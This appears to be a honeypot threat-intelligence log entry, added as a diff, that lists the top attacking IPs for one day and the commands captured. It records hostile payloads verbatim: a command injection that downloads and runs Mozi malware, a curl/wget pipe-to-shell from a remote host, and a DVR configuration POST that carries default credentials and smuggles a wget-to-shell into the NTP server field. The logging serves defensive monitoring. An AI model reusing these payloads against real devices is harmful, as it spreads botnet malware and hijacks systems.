@@ -1,0 +1,27 @@
+Top 5 IPs for 12-09-2024 :
+
+37.156.28.169
+123.56.168.122
+149.50.106.170
+123.154.24.4
+216.36.137.224
+
+Malware Observed:
+
+None
+
+
+Commands/exploits observed :
+
+/language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://192.168.1.1:8088/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-); echo "$X" | sh -s apache.selfrep
+
+
+POST /dvr/cmd HTTP/1.1
+Host: IP
+Accept-Encoding: gzip, deflate
+Content-Length: 41
+Authorization: Basic cm9vdDppY2F0Y2g5OQ==
+User-Agent: Abcd
+
+<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&wget -O- http://103.149.87.69/script/u|sh;echo DONE"/></Service></DVR>]]></SetConfiguration></DVR>
